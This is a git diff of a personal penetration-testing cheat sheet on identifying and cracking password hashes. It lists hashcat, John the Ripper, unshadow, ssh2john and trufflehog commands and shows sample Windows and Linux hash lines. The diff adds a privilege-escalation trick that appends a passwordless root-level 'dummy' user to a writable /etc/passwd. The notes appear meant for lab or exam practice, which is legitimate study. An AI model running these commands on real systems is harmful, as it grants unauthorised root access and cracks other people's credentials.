@@ -1,4 +1,4 @@
-# Identify Hashes
+### Identify Hashes
 ```
 hash-identifier
 ```
@@ -7,19 +7,27 @@ hash-identifier
 hashid $hash
 ```
 
-
-# Find credentials in source
+### For writable /etc/passwd
+```bash
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+### Create password for /etc/passwd
+```bash
+openssl passwd -1 -salt dummy dummy
+```
+### Find credentials in source
 ```bash
 ~/Documents/activeInformationGathering/trufflehog filesystem --no-verification $path
 ```
 
-# Hashcat
+### Hashcat
 NT Hash
 ```powershell
 hashcat -a 3 -m 900 --encoding-to utf16le NTHashes.txt
 ```
 
-# John
+### John
 ```
 unshadow passwd shadow > unshadowed.txt
 ```
@@ -28,16 +36,16 @@ unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt $file
 ```
 
-## Encrypted SSH Key
+### Encrypted SSH Key
 ```bash
 ssh2john $file > id_rsa.hash
 ```
 With this, you can pass id_rsa.hash to john as regular. 
-# For unsalted hashes
+### For unsalted hashes
 https://crackstation.net/
 
-# Formats explained
-### Windows
+## Formats explained
+#### Windows
 | | | | | 
 |-|-|-|-|
 | $Administrator:$|$500:$|$NO PASSWORD*********************:$|$BE134K40129560B46534340292AF4E72:::$|
@@ -55,7 +63,7 @@ If there IS an LM Hash present:
 4. Create wordlist that only contains the found password canidate. It's in uppercase.
 5. Run john with --rules, --format=NT and --wordlist=(the created wordlist) to get the password correctly spelled.
 
-### Linux
+#### Linux
 | | | | | |
 |-|-|-|-|-|
 |root:|\$6|\$IodYKEbO|\$5TglyZFgGW72oeW0Ql/9Wt7KwW2XWeW3TNmBUo94Qsj1tJg.tDs1HIuIlmyr/:|18251:0:99999:7:::|
